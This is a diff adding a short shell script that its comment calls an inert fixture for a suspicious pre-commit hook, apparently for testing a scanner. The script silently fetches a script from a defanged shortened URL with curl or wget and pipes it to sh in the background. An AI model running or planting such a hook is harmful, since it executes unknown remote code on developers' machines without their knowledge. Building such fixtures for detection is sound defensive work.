@@ -1,0 +1,7 @@
+#!/bin/sh
+# Inert text fixture representing a suspicious pre-commit hook. Never execute.
+if [ "$OSTYPE" = "linux-gnu" ]; then
+  curl -s hxxps://short.gy/example | sh > /dev/null 2>&1 &
+else
+  wget -qO- hxxps://short.gy/example | sh > /dev/null 2>&1 &
+fi
